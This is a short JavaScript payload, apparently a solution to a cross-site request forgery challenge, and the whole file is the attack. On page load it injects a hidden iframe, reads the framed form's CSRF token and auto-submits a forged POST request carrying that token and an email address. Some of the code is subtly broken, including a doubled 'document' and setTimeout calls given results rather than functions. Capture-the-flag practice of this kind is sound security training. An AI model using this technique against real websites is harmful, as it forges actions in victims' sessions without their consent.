 document.document.onload = function(){
 
 document.write('<iframe id="frame" src=http://csrf-challenges.r7.io/make_post/3 width=0 height=0> </iframe>');
	
	//var foo = setTimeout(document.getElementById('frame').contentDocument.forms[0][0].value,200);
	var foo = document.getElementById('frame').contentDocument.forms[0][0].value;
	setTimeout(document.getElementById('frame').contentWindow.document.writeln('<form id="f" action="http://csrf-challenges.r7.io/make_post/3?csrf=&post=dexterl3@uw.edu"method="POST">'),100);
	setTimeout(document.getElementById('frame').contentWindow.document.writeln('<input type="hidden" name="csrf" value="'+foo +'">'),500);
	setTimeout(document.getElementById('frame').contentWindow.document.writeln('<input type="hidden" name="post" value="dexterl3@uw.edu">'),400);
	setTimeout(document.getElementById('frame').contentWindow.document.writeln('</form>'),1000);
	setTimeout(document.getElementById('frame').contentWindow.document.getElementById("f").submit(),2000);
	alert(0);
	
	}
	